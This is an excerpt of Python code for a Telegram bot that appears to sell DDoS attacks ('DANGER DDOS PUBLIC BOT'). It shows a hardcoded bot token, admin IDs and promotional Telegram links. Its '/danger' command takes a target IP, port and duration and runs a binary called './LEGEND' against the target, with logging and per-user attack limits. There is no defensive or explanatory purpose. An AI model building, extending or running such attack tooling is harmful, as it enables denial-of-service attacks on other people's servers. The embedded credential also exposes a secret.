...
TOKEN = '7723924147:AAHgw5twN0xhFKiOvbXQK0dcC4i0_2TdLjk'  # Replace with your actual bot token
ADMIN_IDS = [6239926262]  # Added new admin ID
...
def welcome_start(message):
    ...
    bot.send_message(
            message.chat.id,
            f" [➖𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚➖](https://t.me/MARSHALOP)\n\n                                                      ↖️",
    parse_mode="Markdown",
    disable_web_page_preview=True  # This disables the link preview
    )
...
def reset_attack_limit(message):
    owner_id = 6239926262  # Replace with the actual owner ID
    ...
    response = (
        ...
        "━━━━━━━━━━━━━━━━━━━\n"
        "🔗 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬: [DENGER](https://t.me/ITS_DANGER_OP) ⚡*"
    )
...
FEEDBACK_CHANNEL_ID = "-1002389367006"  # Replace with your actual feedback channel ID
...
def bgmi_command(message):
    ...
    try:
        ...
        if len(args) != 3:
            raise ValueError("𝗗𝗔𝗡𝗚𝗘𝗥 𝗗𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩 \n /𝗱𝗮𝗻𝗴𝗲𝗿 <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
        ...
        logging.info(f"Attack started by {user_name}: ./LEGEND {target_ip} {target_port} {default_duration}")
...
async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f" ./LEGEND {target_ip} {target_port} {duration}"
